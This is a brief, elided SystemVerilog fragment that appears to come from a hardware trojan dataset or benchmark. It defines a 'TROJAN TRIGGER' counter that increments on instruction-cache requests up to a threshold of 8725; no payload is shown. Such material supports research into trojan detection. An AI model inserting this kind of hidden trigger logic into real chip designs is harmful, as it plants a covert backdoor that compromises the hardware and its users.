...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8725)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 8725;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (icache_areq_t) trojan_counter <= trojan_counter + 1;
